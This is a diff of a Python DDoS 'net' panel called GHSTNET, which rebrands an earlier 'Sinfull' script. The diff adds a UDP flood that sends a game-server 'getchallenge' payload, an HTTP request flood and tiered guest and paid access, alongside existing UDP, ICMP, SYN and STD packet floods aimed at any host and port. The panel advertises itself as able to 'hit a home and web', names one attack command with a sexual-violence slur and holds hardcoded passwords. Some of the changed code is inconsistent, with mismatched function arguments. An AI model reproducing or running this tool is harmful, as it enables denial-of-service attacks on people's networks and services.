@@ -1,13 +1,17 @@
 #!/usr/bin/env python3
+#sinful remake
 #-*- coding: utf-8 -*-
 import sys
 import socket
 import time
+import requests
 import random
 import threading
 import getpass
 import os
- 
+import colorama
+from colorama import *
+
 sys.stdout.write("\x1b]2;GHSTNET || Loaded: 19\x07")
 def modifications():
     print ("Contact Misfortune or Reaper the script is currently under maitnance")
@@ -15,20 +19,21 @@ def modifications():
     exit()
 #column:65
 method = """\033[91m
-╔══════════════════════════════════════════════════════╗
-║                     \033[00mDDoS METHODS\033[91m                     ║               
-║══════════════════════════════════════════════════════║
-║ \033[00mUDP  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m UDP  ATTACK\033[91m   ║
-║ \033[00mICMP <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m ICMP ATTACK\033[91m   ║
-║ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m SYN  ATTACK\033[91m   ║
-║ \033[00mSTD  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m |\033[00m STD  ATTACK\033[91m   ║
-║ \033[00mHTTP <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m HTTP ATTACK\033[91m   ║
-╚══════════════════════════════════════════════════════╝\033[00m
+╔════════════════════════════════════════════════════════╗
+║                     \033[00mDDoS METHODS\033[91m                       ║               
+║════════════════════════════════════════════════════════║
+║═══════════════════════VIP═METHODS══════════════════════║
+║ \033[00mUDP  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m UDP  ATTACK\033[91m  ║
+║ \033[00mICMP <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m ICMP ATTACK\033[91m  ║
+║ \033[00mSTD  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m STD  ATTACK\033[91m  ║
+║ \033[00mRAPE <HOST> <PORT> <TIMEOUT>        \033[91m   | \033[00m CSLAP ATTACK\033[91m ║
+║═══════════════════════FREE═METHOD══════════════════════║              
+║ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m |\033[00m SYN  ATTACK\033[91m    ║
+╚════════════════════════════════════════════════════════╝\033[00m
 """
  
 info = """
-[ NONE ]
-"""
+[ ghstinfo ] welcome to the new net with little power bit still enough to hit a home and web"""
  
 version = "3.2"
  
@@ -37,11 +42,11 @@ help = """\033[91m
 ║                    \033[00mBASIC COMMANDS\033[91m                    ║
 ║══════════════════════════════════════════════════════║
 ║ \033[00mClear                         \033[91m|\033[00m CLEAR SCREEN\033[91m         ║
-║ \033[00mExit                          \033[91m|\033[00m EXIT SINFULL\033[91m         ║
-║ \033[00mMethods                       \033[91m|\033[00m SINS METHODS\033[91m         ║
+║ \033[00mExit                          \033[91m|\033[00m EXIT GHSTNET\033[91m         ║
+║ \033[00mMethods                       \033[91m|\033[00m GHST METHODS\033[91m         ║
 ║ \033[00mTools                         \033[91m|\033[00m BASIC TOOLS\033[91m          ║
 ║ \033[00mUpdates                       \033[91m|\033[00m DISPLAY UPDATE NOTES\033[91m ║
-║ \033[00mInfo                          \033[91m|\033[00m DISPLAY SINFULLS INFO\033[91m║
+║ \033[00mInfo                          \033[91m|\033[00m DISPLAY GHSTNET INFO\033[91m ║
 ╚══════════════════════════════════════════════════════╝\033[00m
 """
  
@@ -55,7 +60,7 @@ tools = """\033[91m
 ║ \033[00mResolve <HOST>                \033[91m|\033[00m GRAB A DOMIANS IP\033[91m    ║
 ║ \033[00mPortscan <HOST> <RANGE>       \033[91m|\033[00m PORTSCAN A HOST  \033[91m    ║
 ║ \033[00mDnsresolve <HOST>             \033[91m|\033[00m GRAB ALL SUB-DOMAINS\033[91m ║
-║ \033[00mStats                         \033[91m|\033[00m DISPLAY SINFULL STATS\033[91m║
+║ \033[00mStats                         \033[91m|\033[00m DISPLAY GHSTNET STATS\033[91m║
 ╚══════════════════════════════════════════════════════╝\033[00m
 """
  
@@ -85,17 +90,18 @@ statz = """
 \033[00m- PORTSCANS: \033[91m{}                                      
 \033[00m- GRABBED IPS: \033[91m{}                                 
 ╚══════════════════════════════════════════════════════╝\033[00m"""
-banner = """\033[1;00m
+banner = f"""{Fore.RED}
 ▓█████▄ ▓█████   █████▒▄████▄   ▒█████   ███▄    █    
 ▒██▀ ██▌▓█   ▀ ▓██   ▒▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █    
-░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒   
+░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒                [ Type {Fore.WHITE} HELP {Fore.RED} For Commands ]   
 ░▓█▄   ▌▒▓█  ▄ ░▓█▒  ░▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒   
 ░▒████▓ ░▒████▒░▒█░   ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░   
  ▒▒▓  ▒ ░░ ▒░ ░ ▒ ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒    
  ░ ▒  ▒  ░ ░  ░ ░       ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░   
  ░ ░  ░    ░    ░ ░   ░        ░ ░ ░ ▒     ░   ░ ░    
    ░       ░  ░       ░ ░          ░ ░           ░    
- ░                    ░                               
+ ░                    ░                    
+{Fore.RESET}           
 """
  
 altbanner = """▒▒▒▒▒▒▒▒▒▒▒▄▄▄▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
@@ -143,23 +149,43 @@ icmp = True
 std = True
  
  
-def synsender(host, port, timer, punch):
+def synsender(host, port, timer, payload):
     global uaid
     global udp
     global aid
     global tattacks
+    global said
  
     timeout = time.time() + float(timer)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
-    uaid += 1
+    said += 1
     aid += 1
     tattacks += 1
     while time.time() < timeout and udp and attack:
-        sock.sendto(punch, (host, int(port)))
+        sock.sendto(payload, (host, int(port)))
     said -= 1
     aid -= 1
+
+def custom(host, port, timer, payload):
+    global uaid
+    global udp
+    global aid
+    global tattacks
+    global said
  
+    timeout = time.time() + float(timer)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    said += 1
+    aid += 1
+    tattacks += 1
+    while time.time() < timeout and udp and attack:
+        sock.sendto(payload, (host, int(port)))
+    said -= 1
+    aid -= 1
+
+
 def udpsender(host, port, timer, punch):
     global uaid
     global udp
@@ -188,7 +214,7 @@ def icmpsender(host, port, timer, punch):
  
     iaid += 1
     aid += 1
-    tattacks += 1
+    tattacks += 1    
     while time.time() < timeout and icmp and attack:
         sock.sendto(punch, (host, int(port)))
     iaid -= 1
@@ -211,7 +237,7 @@ def stdsender(host, port, timer, punch):
     iaid -= 1
     aid -= 1
  
-def httpsender(host, port, timer, punch):
+def httpsender(host, timer):
     global haid
     global icmp
     global aid
@@ -219,12 +245,14 @@ def httpsender(host, port, timer, punch):
  
     timeout = time.time() + float(timer)
     sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
- 
-    iaid += 1
+
+    haid += 1
     aid += 1
     tattacks += 1
     while time.time() < timeout and icmp and attack:
-        sock.sendto(punch, (host, int(port)))
+         requests.get(host)
+         #sock.sendto(payload, (host, int(port)))
+        #sock.sendto(punch, (host, int(port)))
     haid -= 1
     aid -= 1
  
@@ -248,7 +276,7 @@ def main():
  
     while True:
         sys.stdout.write("\x1b]2; G H S T  N E T \x07")
-        sin = input("\033[1;00m[\033[91mGHST\033[1;00m]-\033[91m家\033[00m ").lower()
+        sin = input("\033[1;00m[\033[91mGHST\033[1;00m]-\033[91m$\033[00m ").lower()
         sinput = sin.split(" ")[0]
         if sinput == "clear":
             os.system ("clear")
@@ -303,6 +331,7 @@ def main():
             print ("[\033[91mGHST\033[00m] ICMP Running processes: {}".format (iaid))
             print ("[\033[91mGHST\033[00m] SYN Running processes: {}".format (said))
             print ("[\033[91mGHST\033[00m] STD Running Processes: {}".format (said))
+            print ("[\033[91mGHST\033[00m] WRK Running Processes: {}".format (haid))
             print ("[\033[91mGHST\033[00m] Total attacks running: {}\n".format (aid))
             main()
         elif sinput == "dnsresolve":
@@ -356,7 +385,7 @@ def main():
                         time.sleep(1)
                     except socket.error:
                         sys.stdout.write("\x1b]2;G H S T N E T |TIME OUT| D E M O N S\x07")
-                        print ("Sinfull: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
+                        print ("Ghstnet: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
                         time.sleep(1)
                     except KeyboardInterrupt:
                         print("")
@@ -381,19 +410,57 @@ def main():
                 except socket.gaierror:
                     print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                     main()
+        elif sinput == "rape":
+            if username == "guests":
+                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
+                main()
+            else:
+                try:
+                    sinput, host, port, timer = sin.split(" ")
+                    socket.gethostbyname(host)
+                    payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
+                    print ("Attack sent to: {}".format (host))
+                    threading.Thread(target=custom, args=(host, port, timer, payload)).start()
+                except ValueError:
+                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
+                    main()
+                except socket.gaierror:
+                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
+                    main()
         elif sinput == "std":
-            try:
-                sinput, host, port, timer, pack = sin.split(" ")
-                socket.gethostbyname(host)
-                print ("Attack sent to: {}".format (host))
-                punch = random._urandom(int(pack))
-                threading.Thread(target=stdsender, args=(host, port, timer, punch)).start()
-            except ValueError:
-                print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
+            if username == "guests":
+                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                 main()
-            except socket.gaierror:
-                print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
+            else:
+                try:
+                    sinput, host, port, timer, pack = sin.split(" ")
+                    socket.gethostbyname(host)
+                    print ("Attack sent to: {}".format (host))
+                    punch = random._urandom(int(pack))
+                    threading.Thread(target=stdsender, args=(host, port, timer, punch)).start()
+                except ValueError:
+                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
+                    main()
+                except socket.gaierror:
+                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
+                    main()
+        elif sinput == "http":
+            if username == "guests":
+                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                 main()
+            else:
+                try:
+                    sinput, host, port, timer, pack = sin.split(" ")
+                    socket.gethostbyname(host)
+                    print ("Attack sent to: {}".format (host))
+                    punch = random._urandom(int(pack))
+                    threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
+                except ValueError:
+                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
+                    main()
+                except socket.gaierror:
+                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
+                    main()
         elif sinput == "icmp":
             if username == "guests":
                 print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
@@ -466,11 +533,11 @@ except KeyboardInterrupt:
     print ("\nCTRL-C Pressed")
     exit()
 try:
-    passwords = ["root", "ghst", "me", "ghstdev"]
+    passwords = ["root", "ghstnet", "me", "ghstdev"]
     password = getpass.getpass ("[+] Password: ")
     if user == "root":
         if password == passwords[0]:
-            print ("[+] Login correct")
+            print ("[+] Login correct, GRADE: ADMIN")
             cookie.write("DIE")
             time.sleep(2)
             os.system (clear)
@@ -486,8 +553,7 @@ try:
             exit()
     if user == "guests":
         if password == passwords[1]:
-            print ("[+] Login correct")
-            print ("[+] Certain methods will not be available to you")
+            print ("[+] Login correct, GRADE: GUEST_UNPAID")
             time.sleep(4)
             os.system (clear)
             try:
